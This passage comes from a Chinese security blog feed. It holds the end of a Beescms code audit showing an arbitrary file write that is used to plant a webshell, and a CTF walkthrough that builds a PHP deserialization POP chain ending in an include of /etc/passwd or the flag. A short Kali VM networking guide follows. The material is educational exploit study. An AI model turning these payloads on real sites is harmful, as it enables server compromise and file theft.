src="/img/Code-Audit-PHP-Beescms/image-20241022234433046.png" alt="image-20241022234433046"></p><h1 id="七、任意文件写入漏洞"><a href="#七、任意文件写入漏洞" class="headerlink" title="七、任意文件写入漏洞"></a>七、任意文件写入漏洞</h1><p>同样在<code>admin/admin_template.php</code>文件中存在一个任意文件写入漏洞，关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//处理模板修改</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;save_template&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line"><span class="comment">//判断文件是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;<span class="title function_ invoke__">msg</span>(<span class="string">&#x27;不存在该文件，请重新操作&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;模板打开失败,请确定【&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;】模板是否存在&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$template</span>);</span><br><span class="line"><span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了一个<code>stripslashes</code>函数对我们传入的数据进行了过滤，这个函数只是去除字符串中的反斜杠\，不影响我们写入webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;1&#x27;2\&quot;3&lt;4&gt;5? 6&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;  <span class="comment">// 输出：1&#x27;2&quot;3&lt;4&gt;5? 6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以beescms根目录下的phpinfo.php 文件为例写入webshell</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022235331691.png" alt="image-20241022235331691"></p><p>成功写入</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[NISACTF 2022]popchains—PHP反序列化POP链</title>
      <link href="/2024/07/23/CTF-competition-PHPserialize-pop/"/>
      <url>/2024/07/23/CTF-competition-PHPserialize-pop/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains—PHP反序列化POP链"><a href="#NISACTF-2022-popchains—PHP反序列化POP链" class="headerlink" title="[NISACTF 2022]popchains—PHP反序列化POP链"></a>[NISACTF 2022]popchains—PHP反序列化POP链</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br></pre></td></tr></table></figure><p>是一道非常经典的PHP反序列化的POP链调用的题，非常有参考学习价值</p><h2 id="二、横扫pop链盲区"><a href="#二、横扫pop链盲区" class="headerlink" title="二、横扫pop链盲区"></a>二、横扫pop链盲区</h2><h3 id="1、反序列化中常见起点函数"><a href="#1、反序列化中常见起点函数" class="headerlink" title="1、反序列化中常见起点函数"></a>1、反序列化中常见起点函数</h3><ol><li>__wakeup 一定会调用：在反序列化之前被调用</li><li>__destruct 一定会调用：当一个对象销毁时被调用。及反序列化之后的对象执行的内容走完之后，无路可走，他就会走</li><li>__toString 当一个对象反序列化后被当做字符串调用</li></ol><h3 id="2、反序列化中常见的中间跳板"><a href="#2、反序列化中常见的中间跳板" class="headerlink" title="2、反序列化中常见的中间跳板"></a>2、反序列化中常见的中间跳板</h3><ol><li>__toString 当一个对象被当做字符串使用</li><li>__get 读取不可访问或不存在属性时被调用</li><li>__set 当给不可访问或不存在属性赋值时被调用</li><li>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</li><li>__invoke：当脚本尝试将对象调用为函数时触发。形如 $this-&gt;$func();</li></ol><h3 id="3、反序列化中常见的终点函数"><a href="#3、反序列化中常见的终点函数" class="headerlink" title="3、反序列化中常见的终点函数"></a>3、反序列化中常见的终点函数</h3><ol><li>__call 调用不可访问或不存在的方法时被调用</li><li>call_user_func 一般php代码执行都会选择这里</li><li>call_user_func_array 一般php代码执行都会选择这里</li></ol><h2 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h2><h3 id="1、锁定入口类"><a href="#1、锁定入口类" class="headerlink" title="1、锁定入口类"></a>1、锁定入口类</h3><p>先看非class 类的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是获取一个get 参数，之后对其值进行反序列化操作，反序列化一个实例对象出来。既然知道对值进行了反序列化，那么这个<code>wish</code>的值一定是某个对象序列化后的值。通读下文知道，这里有三个class 类，也就是说，答案就是一下三个其中一个class 对象的序列化值。</p><p>那具体是谁？我们知道，有三个入口函数，分别是<code>__wakeup</code>、<code>__destruct </code>和<code>__toString</code>函数。我们逐步分析</p><ol><li><code>__wakeup</code>函数：在反序列化的对象被激活之前，会走<code>__wakeup</code>函数，在三个class 类中，只有<code>Road_is_Long</code>类有这个函数，也就是说<code>Road_is_Long</code>类是可以作为入口类</li><li>__destruct 函数：三个class 类中没有这个函数，所以也就不能用这个来评估入口类</li><li>__toString 函数：这个函数在被作为入口评估函数之前，需要在非class 类的部分中，反序列化后被当做字符串调用才能作为入口评估函数。比如：<code>echo @unserialize($\_GET[&#39;wish&#39;]);</code>，所以在本题中也不能被作为入口评估函数</li></ol><p>这样，我们锁定了入口的class 类 <code>Road_is_Long</code>，那么，我们需要写代码了</p><p>新建一个php文件，把这个入口的class类<code>Road_is_Long</code>复制过去，并删除他所有的魔术方法。再对这个类做实例化和序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723172057611.png" alt="image-20240723172057611"></p><p>OK，好极了，那么这里剩下了两个变量，这两个变量的值是多少需要往下走。</p><h3 id="2、-wakeup-函数"><a href="#2、-wakeup-函数" class="headerlink" title="2、__wakeup 函数"></a>2、__wakeup 函数</h3><p>之后就该读__wakeup入口函数的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">        echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">$this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提到了 page 变量，对这个变量进行正则匹配，过滤了很多的协议。如果匹配成功，则更改这个变量的值为<code>index.php</code>。</p><ol><li>思路一：大家可能会尝试绕过这个正则匹配，继续往后走。但问题是不管有没有绕过这个函数，当这个函数走完之后走哪个函数呢？已经到了无路可走的时候了，而这个class 中既无<code>__destruct </code>函数，也无其他的终点函数，代码直接走到头了。</li><li>思路二：page 变量在进行正则匹配的时候，是会被当作字符串去看待。有没有感觉眼熟，没错，如果此时page变量的值正好是某个对象的话，则会触发这个对象的<code>__toString</code>函数。而其本身<code>Road_is_Long</code>是已经被反序列化出来的对象，且具备<code>__toString</code>函数</li></ol><p>则page 变量的内容确定，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这样子，将会走到<code>__toString</code>函数里面去，就剩string变量的内容了</p><h3 id="3、-toString-函数"><a href="#3、-toString-函数" class="headerlink" title="3、__toString 函数"></a>3、__toString 函数</h3><p>之后读__toString 函数的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">return $this-&gt;string-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常简单，只有一行代码，但是基础薄弱的伙伴看到会感觉懵了很，看不懂。其实这个很简单，我们拆开看</p><ol><li>第一部分：<code>$this-&gt;string</code>，这里其实说的就是这个对象的<code>$string</code>变量，也就是我们剩下的第二个变量。</li><li>第二部分：<code>string-&gt;page</code>，这里是个迷惑行为，这个<code>string</code>指我们的变量，第二个<code>page</code>变量指的是其他。它并不是我们的page变量，而是随意的一个内容均可，如<code>string-&gt;abc</code>，对这个题是没有任何影响。</li></ol><blockquote><p>1、我们知道一个实例化的对象，才可以用-&gt;，如我们写的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br></pre></td></tr></table></figure><p>中$ril是对象，才可以用-&gt;来调用page变量</p><p>2、同样的$this-&gt;string-&gt;page</p><p>意味$this-&gt;string是一个对象，看整体</p><p>$this-&gt;string                     -&gt;page</p><p>​           对象            的         page变量</p></blockquote><p>所以，第二个变量string也是一个对象。那具体是谁的对象？</p><ol><li>思路一：那就看谁的class类里面有page变量咯。但是只有<code>Road_is_Long</code>对象才有page变量啊，啊？这怎么回事儿，感觉脑袋有点懵，怎么又调用回来了？</li><li>思路二：已经走到了反序列化中常见的中间跳板函数。__get 当读取不可访问或不存在属性时被调用。如果这个string 的值是<code>Make_a_Change</code>类的实例对象，而这个类中没有page 变量，但是有<code>get函数</code>啊。这样一来，就走到这个类里面的 <code>get 函数</code>里面了</li></ol><p>则string 的内容确定，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么这个时候又多出来了一个<code>$effort</code>变量，需要确定这个变量的值是多少</p><h3 id="4、-get-函数"><a href="#4、-get-函数" class="headerlink" title="4、__get 函数"></a>4、__get 函数</h3><p>那继续看<code>__get</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)&#123;</span><br><span class="line">$function = $this-&gt;effort;</span><br><span class="line">return $function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正好，这里提到了effort 变量。</p><ol><li>$function &#x3D; $this-&gt;effort; 将effort变量的值给$function 变量，这没啥，可关键在第二行</li><li>return $function(); 这什么鬼，一个变量后面加个()，会不会懵。但我们在往上看中间跳板的那些函数中，有无与这个相关。__invoke：当脚本尝试将对象调用为函数时触发。欸，如果此时effort 变量的值是一个对象的话，$function() 不就相当于把这个对象当成函数来调用了吗。而在<code>Try_Work_Hard</code> 类中正好有这个<code>invoke</code>函数</li></ol><p>此时，effort变量的值确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意：我们拿过来的类，需要把里面所有的方法都去掉，只留下变量即可。</p><p>这下又多出来一个未知的变量：<code>Try_Work_Hard</code>类里面的 <code>$var</code>变量。继续往后看</p><h3 id="5、-invoke-函数"><a href="#5、-invoke-函数" class="headerlink" title="5、__invoke 函数"></a>5、__invoke 函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke()&#123;</span><br><span class="line">$this-&gt;append($this-&gt;var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是只有一行代码，把本对象的var 变量的值做为参数传入本对象的append 方法中，噢，看来要迎来结局了</p><p>看本对象的append 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function append($value)&#123;</span><br><span class="line">include($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了文件包含，看来整个代码的利用核心就在这里，那这个<code>$var</code>的值，就是我们最终的payload了。</p><p>欸，但是又出现了一个点，如下</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$var变量是由protected 进行修饰，我们实例化的对象无法进行调用</p><p>也就是说，我们无法写$twh-&gt;var；这样的代码</p></blockquote><p>所以只能在class类中写入，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(serialize($ril));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OK，整个代码分析结束</p><h2 id="四、提交答案"><a href="#四、提交答案" class="headerlink" title="四、提交答案"></a>四、提交答案</h2><p>看下整个代码的输出结果</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183004058.png" alt="image-20240723183004058"></p><p>还挺长的，把双引号中的拿过去</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183240459.png" alt="image-20240723183240459"></p><p>噢， 啥也没有输出。</p><p>这个时候需要把我们的内容做一个url编码，当然也可以直接在代码里面做，在输出的时候添加一个urlencode即可，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;file:///etc/passwd&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$ril = new Road_is_Long();</span><br><span class="line">$ril-&gt;page = $ril;</span><br><span class="line"></span><br><span class="line">$mac = new Make_a_Change();</span><br><span class="line">$ril-&gt;string = $mac;</span><br><span class="line"></span><br><span class="line">$twh = new Try_Work_Hard();</span><br><span class="line">$mac-&gt;effort = $twh;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($ril)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个时候，把我们的这一坨给他</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183424076.png" alt="image-20240723183424076"></p><p>OK，非常的完美</p><p>针对这道题而言，只需要把<code>/etc/passwd</code>换成<code>/flag</code>即可，甚至可使用php伪协议</p><p><img src="/img/CTF-competition-PHPserialize-pop/image-20240723183646708.png" alt="image-20240723183646708"></p>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】VirtualBox和VMware的kali搭配食用</title>
      <link href="/2024/07/23/Nouns-VirtualBox-VMware-networking/"/>
      <url>/2024/07/23/Nouns-VirtualBox-VMware-networking/</url>
      
        <content type="html"><![CDATA[<h1 id="VirtualBox和VMware的kali搭配食用"><a href="#VirtualBox和VMware的kali搭配食用" class="headerlink" title="VirtualBox和VMware的kali搭配食用"></a>VirtualBox和VMware的kali搭配食用</h1><h2 id="一、VirtualBox虚拟机的配置"><a href="#一、VirtualBox虚拟机的配置" class="headerlink" title="一、VirtualBox虚拟机的配置"></a>一、VirtualBox虚拟机的配置</h2><p>这里任何机器都需要配置成这样</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160128312.png" alt="image-20240723160128312"></p><h2 id="二、VMware的网络配置"><a href="#二、VMware的网络配置" class="headerlink" title="二、VMware的网络配置"></a>二、VMware的网络配置</h2><p>这里需要跟上面VirtualBox虚拟机的配置保持在同一个网卡</p><p>有的小伙伴第一次整，VMware的配置这里可能没有这个网卡，我的建议是重启下电脑</p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160247626.png" alt="image-20240723160247626" style="zoom:150%;" /><h2 id="三、VMware中kali-的配置"><a href="#三、VMware中kali-的配置" class="headerlink" title="三、VMware中kali 的配置"></a>三、VMware中kali 的配置</h2><h3 id="1、桥接网卡（第一块网卡）"><a href="#1、桥接网卡（第一块网卡）" class="headerlink" title="1、桥接网卡（第一块网卡）"></a>1、桥接网卡（第一块网卡）</h3><p>我们需要把网卡配置成桥接模式，注意，是第一块网卡，也就是kali 默认的那块</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160550901.png" alt="image-20240723160550901"></p><h3 id="2、NAT网卡"><a href="#2、NAT网卡" class="headerlink" title="2、NAT网卡"></a>2、NAT网卡</h3><p>配置好第一块网卡之后，再添加一块NAT网卡，是为了方便与网络交互，避免下载某个工具无法上网的问题</p><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160722820.png" alt="image-20240723160722820"></p><h3 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h3><p>网卡配好之后，打开kali，需要修改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>添加dhcp，如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure><p><img src="/img/Nouns-VirtualBox-VMware-networking/image-20240723160955764.png" alt="image-20240723160955764"></p><p>之后重启网络即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart networking.service</span><br></pre></td></tr></table></figure><p>当然，有的小伙伴这里重启之后感觉没啥用，网段也没变化等待；</p><p>建议在开启VirtualBox虚拟机之后，再开启kali</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-BTRsys1</title>
      <link href="/2024/07/22/OSCP-BTRsys1/"/>
      <url>/2024/07/22/OSCP-BTRsys1/</url>
      
